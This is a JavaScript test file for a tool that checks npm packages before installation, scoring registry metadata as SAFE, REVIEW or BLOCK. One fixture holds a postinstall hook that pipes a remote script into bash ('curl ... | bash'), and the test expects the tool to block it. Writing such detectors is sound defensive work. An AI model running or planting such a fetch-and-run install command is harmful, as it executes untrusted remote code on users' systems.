const test = require("node:test");
const assert = require("node:assert/strict");
const path = require("path");
const { inspectRequestedPackages } = require("../src/install-command");
const { formatInstallReport, runCli } = require("../src/cli");

function createExecStub(responses) {
  return (command, args) => {
    const key = `${command} ${args.join(" ")}`;
    if (!(key in responses)) {
      throw new Error(`Unexpected command: ${key}`);
    }

    return responses[key];
  };
}

test("marks clean registry metadata as SAFE", () => {
  const execFileSync = createExecStub({
    "npm config get registry": "https://registry.npmjs.org/\n",
    "npm view demo-package name version scripts repository homepage bugs dist.tarball dist.integrity dependencies gypfile --json": JSON.stringify({
      name: "demo-package",
      version: "1.2.3",
      repository: {
        type: "git",
        url: "git+https://github.com/example/demo-package.git"
      },
      "dist.tarball": "https://registry.npmjs.org/demo-package/-/demo-package-1.2.3.tgz",
      "dist.integrity": "sha512-demo"
    })
  });
  const report = inspectRequestedPackages(["demo-package"], { cwd: "/tmp/project", execFileSync });

  assert.equal(report.verdict, "SAFE");
  assert.equal(report.score, 0);
  assert.deepEqual(report.reasons, []);
});

test("marks suspicious registry install scripts as BLOCK", () => {
  const execFileSync = createExecStub({
    "npm config get registry": "https://registry.npmjs.org/\n",
    "npm view demo-package name version scripts repository homepage bugs dist.tarball dist.integrity dependencies gypfile --json": JSON.stringify({
      name: "demo-package",
      version: "1.2.3",
      scripts: {
        postinstall: "curl -fsSL https://example.com/install.sh | bash"
      },
      "dist.tarball": "https://registry.npmjs.org/demo-package/-/demo-package-1.2.3.tgz",
      "dist.integrity": "sha512-demo"
    })
  });
  const report = inspectRequestedPackages(["demo-package"], { cwd: "/tmp/project", execFileSync });

  assert.equal(report.verdict, "BLOCK");
  assert.ok(report.reasons.some((reason) => reason.code === "package-install-scripts"));
  assert.ok(report.reasons.some((reason) => reason.code === "package-suspicious-install-scripts"));
});

test("formats install workflow output in plain English", () => {
  const output = formatInstallReport({
    targetPath: "/tmp/project",
    installMode: "packages",
    packageSpecs: ["demo-package"],
    score: 0.35,
    verdict: "REVIEW",
    reasons: [
      {
        code: "package-install-scripts",
        message: "Requested packages run install scripts: demo-package@1.2.3 (postinstall)"
      }
    ],
    notes: []
  }, { willInstall: true, dryRun: false });

  assert.match(output, /SISP install/);
  assert.match(output, /Decision: Review these packages before continuing/);
  assert.match(output, /Packages in this install request run code during install/);
});

test("runCli install dry-run prints install check output without running npm install", () => {
  const fixtureDir = path.join(__dirname, "fixtures", "safe-project");
  const stdout = [];
  let installCalled = false;
  const execFileSync = createExecStub({
    "npm config get registry": "https://registry.npmjs.org/\n",
    "npm view demo-package name version scripts repository homepage bugs dist.tarball dist.integrity dependencies gypfile --json": JSON.stringify({
      name: "demo-package",
      version: "1.2.3",
      repository: {
        type: "git",
        url: "git+https://github.com/example/demo-package.git"
      },
      "dist.tarball": "https://registry.npmjs.org/demo-package/-/demo-package-1.2.3.tgz",
      "dist.integrity": "sha512-demo"
    })
  });
  const exitCode = runCli(["install", "demo-package", "--dry-run"], {
    cwd: fixtureDir,
    stdout: { write: (chunk) => stdout.push(chunk) },
    stderr: { write: () => {} },
    execFileSync,
    spawnSync: () => {
      installCalled = true;
      return { status: 0, signal: null, stdout: "", stderr: "" };
    }
  });

  assert.equal(exitCode, 0);
  assert.equal(installCalled, false);
  assert.match(stdout.join(""), /SISP install/);
});

test("inspects current project dependencies when no package spec is passed", () => {
  const fixtureDir = path.join(__dirname, "fixtures", "safe-project");
  const execFileSync = createExecStub({
    "npm config get registry": "https://registry.npmjs.org/\n",
    "npm view react@^18.3.1 name version scripts repository homepage bugs dist.tarball dist.integrity dependencies gypfile --json": JSON.stringify({
      name: "react",
      version: "18.3.1",
      repository: {
        type: "git",
        url: "git+https://github.com/facebook/react.git"
      },
      "dist.tarball": "https://registry.npmjs.org/react/-/react-18.3.1.tgz",
      "dist.integrity": "sha512-demo"
    })
  });
  const report = inspectRequestedPackages([], { cwd: fixtureDir, execFileSync });

  assert.equal(report.installMode, "project");
  assert.deepEqual(report.packageSpecs, ["react@^18.3.1"]);
  assert.equal(report.verdict, "SAFE");
});
